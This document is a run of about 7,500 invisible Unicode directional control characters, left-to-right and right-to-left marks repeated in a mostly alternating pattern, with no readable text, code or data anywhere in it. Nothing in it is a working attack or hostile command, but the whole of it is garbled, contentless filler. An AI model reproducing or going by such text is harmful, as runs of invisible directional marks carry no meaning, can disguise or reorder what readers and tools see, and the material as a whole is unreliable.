‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎